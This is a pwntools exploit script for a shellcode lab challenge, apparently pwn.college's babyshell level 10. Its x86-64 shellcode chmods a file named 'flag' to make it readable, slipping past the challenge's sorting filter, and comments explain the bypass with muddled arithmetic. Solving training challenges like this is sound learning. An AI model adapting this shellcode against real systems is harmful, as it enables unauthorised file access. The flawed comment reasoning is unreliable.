from pwn import *
from grwnapy.pwn import find_offset

# Allows you to switch between local/GDB/remote from terminal


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = '/challenge/babyshell-level-10'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                           EXPLOIT
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

# offset = find_offset(exe, cyclic(500))
# win = elf.symbols['win']

# CHALLENGE DESC
# Write and execute shellcode to read the flag, but your input is sorted before being executed and stdin is closed.
# Bytes are sorted 8 bytes at a time (meaning if the code is 16 bytes long, only 2 piece are sorted)
# However, the check is done using shellcode_size / sizeof(uint64_t) -1
# Which is shellcode_size / 7, so if shellcode_size is 14, the sort_max is 2
# However, if the size is < 14, for example, 13. 13 / 7 in integer division results in 1, and if sort_max is 1.
# Within the loop, no sorting actually happens

# The second part is closing the stdin, and since our shellcode is 1-staged, this doesnt affect us at all


assembly = """
    push 0x67616c66
    push rsp
    pop rdi 
    push 6
    pop rsi
    push 90
    pop rax
    syscall
    """

# CHMOD with flag as path (not /flag)
# This means the python script needs to be run inside the '/' directory '/home/hacker'

shellcode = asm(assembly)
print(shellcode)

io = start()

payload = flat([shellcode])

io.sendlineafter(b'', payload)
io.recvuntil(b'')

io.interactive()
